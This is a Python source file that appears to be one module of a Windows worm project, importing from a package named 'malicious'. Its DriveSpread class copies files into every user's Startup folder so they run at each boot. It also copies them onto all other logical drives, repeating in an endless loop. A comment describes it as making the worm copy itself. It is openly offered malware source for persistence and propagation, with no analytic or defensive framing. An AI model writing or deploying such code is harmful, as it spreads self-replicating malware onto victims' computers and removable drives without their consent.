import os
import time
from shutil import copy2
from threading import Thread

import win32api

from malicious.maliciousConstants import STARTUP_PATH, ONE_INDEX, LAST, SLEEP_SPREADING


class DriveSpread:
    def __init__(self, file_paths):
        # self.paths = file_paths
        thread = Thread(target=self.drive_spreading(file_paths))
        thread.start()

    @staticmethod
    def drive_spreading(file_paths):
        user_path = os.path.expanduser('~').replace("\\", "/")
        user_directory_path = user_path[:user_path.rfind("/") + ONE_INDEX]
        user_names = os.listdir(user_directory_path)
        # This function makes the worm copy itself on other drives on the computer
        # (also on the "startup" folder to be executed every time the computer boots)
        while True:
            for file_path in file_paths:
                drives = win32api.GetLogicalDriveStrings()
                drives = drives.split('\000')[:LAST]
                for drive in drives:
                    try:
                        if "C:\\" == drive:
                            for user in user_names:
                                try:
                                    copy2(file_path, user_directory_path + user + STARTUP_PATH)
                                    print(user + STARTUP_PATH)
                                except Exception as error:
                                    print(f"Error in copying file to {user_path}.\n Error raised: {error} ")
                        else:
                            copy2(file_path, drive)
                    except Exception as error:
                        f"Error in copying file to drive: {drive}.\n Error raised: {error}"
            time.sleep(SLEEP_SPREADING)
